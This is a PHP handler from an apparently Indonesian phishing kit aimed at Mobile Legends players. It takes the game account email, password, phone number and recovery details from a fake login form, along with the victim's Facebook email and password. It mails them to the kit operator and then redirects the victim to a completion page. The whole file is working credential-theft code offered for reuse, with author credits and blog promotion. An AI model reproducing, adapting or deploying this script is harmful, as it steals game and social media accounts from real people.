<!-- https://ra-biitch.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<!--SCRIPT ORI BY: RIYAN ANDHIKA https://facebook.com/mctb.store -->

<?php
session_start();
include('email.php');
if(isset($_POST['email-angelhost'])){
$email = $_POST['email-angelhost'];
$password = $_POST['password-angelhost'];
$emailfb = $_POST['emailfb-angelhost'];
$passfb = $_POST['passfb-angelhost'];
$phone = $_POST['tlp-angelhost'];
$level = $_POST['level-angelhost'];
$recov = $_POST['recov-angelhost'];
$login = $_POST['login-angelhost'];
$nickname = $_POST['name-angelhost'];

$tomail = $emailresult; //TAG EMAIL RESULT MU DI email.php

$subject = 'SETOR MOBILE LEGEND LEVEL [ '.$level.' ]';
$message = '
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=6><b>MOBILE LEGEND</b></font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:#16a085;color:white;text-align:center;">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="color:green;padding:0px;background:white">
				EMAIL
			</th>
			<th style="color:green;padding:3px;background:white">
				PASS
			</th>
			<th style="color:green;padding:3px;background:white">
				LEVEL
			</th>
<th style="color:green;padding:3px;background:white">
				RECOVERY
			</th>
<th style="color:green;padding:3px;background:white">
				HP
			</th>
<th style="color:green;padding:3px;background:white">
				LOGIN
			</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$email.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$password.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$level.'</b>
			</td>
<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$recov.'</b>
			</td>			
<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$phone.'</b>
			</td>
<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$login.'</b>
			</td>
		</tr>
	</tbody>
</table>
       
</div><!-- https://ra-biitch.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<!--SCRIPT ORI BY: RIYAN ANDHIKA https://facebook.com/mctb.store -->
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=6><b>FACEBOOK</b></font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:#16a085;color:white;text-align:center;">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="color:green;padding:0px;background:white">
				EMAIL
			</th>
			<th style="color:green;padding:3px;background:white">
				PASS
			</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$emailfb.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$passfb.'</b>
			</td>
		</tr>
	</tbody>
</table>
IP Info   :  ('.$alamat.') | '.$nama_negro.' On '.gmdate('r').' <br>
Browser   :  '.$_SERVER['HTTP_USER_AGENT'].'

       
</div>

<center><!-- fb.com/riyan.mettal --></center>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:silver;text-align:center;"><font size=6 color=white><b> ILHAM X-SHOP <a href="http://facebook.com/riyan.mettal"></a></b></font></div>
</center>
';

$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: ILHAM X-SHOP <ilham@info.id' . "\r\n";

$datamail = mail($tomail, $subject, $message, $headersx);
if($datamail) {
echo '<script>window.location.replace("completed.php")</script>';} 
}
?>

<!--SCRIPT ORI BY: RIYAN ANDHIKA https://facebook.com/mctb.store -->